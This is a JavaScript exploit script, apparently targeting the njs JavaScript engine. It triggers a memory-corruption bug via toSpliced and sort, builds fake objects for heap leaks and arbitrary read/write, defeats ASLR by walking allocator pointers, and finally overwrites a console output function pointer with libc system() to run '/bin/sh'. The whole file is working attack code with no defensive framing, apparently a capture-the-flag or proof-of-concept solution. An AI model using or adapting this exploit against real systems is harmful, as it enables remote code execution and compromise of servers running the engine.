// globals
const BUFSIZE = 0x410;
let u8Arr = new Uint8Array(BUFSIZE+8);
let fakeObj;
u8Arr.fill(0x51);
let raw_buf = new Uint8Array(0x2000);
raw_buf.fill(0x15);


// helpers
const sus_func = (s) => {
    throw new Error("brrrrr"); 
}

const trigger = () => {
    let retval;
    let buggy_arr = new Array(0x100);

    Object.defineProperty(buggy_arr, 0, { get: sus_func });
    u8Arr.sort((x, y) => { return false; }); // free the uint8 buffer, this will be our forged arr 

    try {
        retval = buggy_arr.toSpliced((BUFSIZE/0x10 + 1)); // trigger bug / alloc and bail-out
    } catch (e) { }

    return retval;
}

const ptr_u64 = (buff) => {
    var int = buff[0];

    for (var i = 1; i < buff.length; i++) {
        int += (buff[i] * Math.pow(2, 8 * i));
    }
    return int;
}

const ptr_p64 = (num) => {
    let hex = num.toString(16);
    let bytes = new Uint8Array(8);
    let idx = 0;
    idx += (8-Math.floor((hex.length/2)));
    for (let c = 0; c < hex.length; c += 2) {
        bytes[idx] = (parseInt(hex.substr(c, 2), 16));
        idx++;
    }
    return bytes.reverse();
}

const get_heapleak = () => {
    let fake_arr;
    // metadata
    u8Arr[0x10 * 0x41 + 0] = 5;     // type: string
    u8Arr[0x10 * 0x41 + 1] = 0xfe;  // short string
    u8Arr[0x10 * 0x41 + 2] = 0;
    u8Arr[0x10 * 0x41 + 3] = 0;
    
    // first 4 bytes
    u8Arr[0x10 * 0x41 + 4] = 0x42;
    u8Arr[0x10 * 0x41 + 5] = 0x42;
    u8Arr[0x10 * 0x41 + 6] = 0x42;
    u8Arr[0x10 * 0x41 + 7] = 0x42;
    fake_arr = trigger();

    let leak = fake_arr[BUFSIZE/0x10];
    let ptr_raw = Buffer.from(leak).slice(6);
    return ptr_raw;
}

const oob_read = (addr) => {
    let fake_arr;
    u8Arr[0x10 * 0x4 + 0] = 5;     // type: string
    u8Arr[0x10 * 0x4 + 1] = 0xff;  // long string
    u8Arr[0x10 * 0x4 + 2] = 0;
    u8Arr[0x10 * 0x4 + 3] = 0;
    
    // value.long_string.size
    u8Arr[0x10 * 0x4 + 4] = 0x42;
    u8Arr[0x10 * 0x4 + 5] = 0x42;
    u8Arr[0x10 * 0x4 + 6] = 0x42;
    u8Arr[0x10 * 0x4 + 7] = 0x42;

    // value.long_string.data
    u8Arr[0x10 * 0x4 +  8] = addr[0]; // lsb
    u8Arr[0x10 * 0x4 +  9] = addr[1];
    u8Arr[0x10 * 0x4 + 10] = addr[2];
    u8Arr[0x10 * 0x4 + 11] = addr[3];
    u8Arr[0x10 * 0x4 + 12] = addr[4];
    u8Arr[0x10 * 0x4 + 13] = addr[5];
    u8Arr[0x10 * 0x4 + 14] = addr[6];
    u8Arr[0x10 * 0x4 + 15] = addr[7]; // msb
    
    fake_arr = trigger();
    return fake_arr[4];
}

const write_qword = (qword, offset) => {
    let bytes = ptr_p64(qword);
    for(let idx=0; idx<bytes.length; idx++) {
        u8Arr[offset+idx] = bytes[idx];
    }
}

const write_qword_rawBuf = (qword, offset) => {
    let bytes = ptr_p64(qword);
    for(let idx=0; idx<bytes.length; idx++) {
        raw_buf[offset+idx] = bytes[idx];
        // console.log((offset+idx).toString(16))
    }
}

const get_forged_ta = (addr) => {
    let struct = [
        0x0000000000000015, // type: TYPED_ARRAY
        addr,               // data:  
    ];
    for(let idx=0; idx<struct.length; idx++) {
        write_qword(struct[idx], (0x10*5  + idx*8))
    }
    fakeObj = trigger()[5];
    let struct2 = [
        0x0000000000000000, //  object.hash.slot
        0x0000000000000000, //  object.shared_hash.slot
        0xdeadbeef, //  __proto__
        0x0000000000000000, //  object.slots
        0x0000000000000015, //  object.type
        addr+0x100, //  object.buffer
        0x0000000000000000, //  object.offset
        0x0000000000000418, //  object.byte_length
        0x0000000000000013, //  object.type
    ];
    
    
    for(let idx=0; idx<struct2.length; idx++) {
        // console.log(struct2[idx])
        write_qword_rawBuf(struct2[idx], 0x100+(idx*8));
    }
    return fakeObj;
}

const arb_write = (where, what) => {
    let struct3 = [
        0x0000000000000000,
        0x0000000000000000,
        0x0000000000000000,
        0x0000000000000000,
        0x0000000000000015,
        0x0000000000002000,
        where,
    ];
    
    // set the ptr
    for(let idx=0; idx<struct3.length; idx++) {
        write_qword_rawBuf(struct3[idx], (idx*8)+0x200)
    }

    // write the data
    for(let idx=0; idx<what.length; idx++) {
        fakeObj[idx] = what[idx];
    }
}

const arb_read = (where) => {
    let struct3 = [
        0x0000000000000000,
        0x0000000000000000,
        0x0000000000000000,
        0x0000000000000000,
        0x0000000000000015,
        0x0000000000003000,
        where,
    ];
    
    // set the ptr
    for(let idx=0; idx<struct3.length; idx++) {
        write_qword_rawBuf(struct3[idx], (idx*8)+0x200);
    }
    // deref & read
    // console.log(`leak :: ${fakeObj[0]}`);
    return [
            fakeObj[0],
            fakeObj[1],
            fakeObj[2],
            fakeObj[3],
            fakeObj[4],
            fakeObj[5],
            fakeObj[6],
            fakeObj[7],
    ];
}


// main
let heap_ptr_raw, heap_ptr;

// step 0 - leak
heap_ptr_raw = get_heapleak();
heap_ptr = ptr_u64(heap_ptr_raw);
console.log(`[*] heap leak = 0x${heap_ptr.toString(16)}`)


let heap_ptr_raw_2 = Buffer.from(oob_read(heap_ptr_raw).slice(0, 7));
let heap_ptr_raw_3 = Buffer.from(oob_read(heap_ptr_raw_2).slice(0, 7));

console.log(`[?] heap_ptr_raw_2 = 0x${ptr_u64(heap_ptr_raw_2).toString(16)}`);
console.log(`[?] heap_ptr_raw_3 = 0x${ptr_u64(heap_ptr_raw_3).toString(16)}`);

// step 1 - understand where we are on the heap
let long_str;
let part_str;
long_str = oob_read(heap_ptr_raw_3); // deref the heap leak
console.log(`[*] long string length: 0x${long_str.length.toString(16)}`);


part_str = long_str.slice(0, 0x80000);
let part_raw = Buffer.from(part_str);
let offset = part_raw.indexOf(raw_buf);
if(offset == -1) { throw new Error('Exploit failed, offset is -1'); }

console.log(`[*] offset: ${offset}`);
let addrof_ptr3 = ptr_u64(heap_ptr_raw_3)+offset-0x3300; // offset to beginning of chunk is not accurate
let start_ptr3 = ptr_p64(addrof_ptr3);
console.log(`[?] addrof raw_buf = 0x${(addrof_ptr3).toString(16)}`);


// step 2 - build a fakeObj primitive
fakeObj = get_forged_ta(addrof_ptr3+0x100);

// step 3 - break ASLR
console.log("[*] Scanning the allocator's ptr tree");
let rbtree_cmp;
let cur_node = ptr_u64(arb_read(heap_ptr));
console.log(`>starting at 0x${cur_node.toString(16)}`);
for(let i=0; i<0x100;i++) {
    let addr_bytes = ptr_p64(cur_node);
    // if the first 2 byets of the ptr are not zero, it is (likely) not a pointer
    if(addr_bytes[6] != 0 && addr_bytes[7] != 0) {
        break;
    }
    rbtree_cmp = cur_node;
    cur_node = ptr_u64(arb_read(cur_node+8));
    console.log(` -> cur node 0x${cur_node.toString(16)}`);
}

console.log(`[+] njs_mp_rbtree_compare @ 0x${rbtree_cmp.toString(16)}`);

let njs_base = rbtree_cmp - 0x12dcd;
console.log(`[*] njs base @ 0x${njs_base.toString(16)}`);
let plt_open = ptr_u64(arb_read(njs_base+0xb8d08));
console.log(`[*] libc open @ 0x${plt_open.toString(16)}`);
let libc_base = plt_open - 0x1144e0;
console.log(`[*] libc base @ 0x${libc_base.toString(16)}`);

// step 4 - Overwrite `njs_console->engine->output()` function ptr
let njs_console = njs_base+0xc68c0;
console.log(`[*] njs_console @ 0x${njs_console.toString(16)}`);
let engine = ptr_u64(arb_read(njs_console));
console.log(`[*] njs_console->engine @ 0x${engine.toString(16)}`);
let fcn_ptr = engine+0x40;
console.log(`[*] njs_console->engine->output @ 0x${fcn_ptr.toString(16)}`);

let libc_system = libc_base+0x50d70;

arb_write(engine, [0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x0]);
arb_write(fcn_ptr, ptr_p64(libc_system));
console.log("[*] jumping to system(), go go go");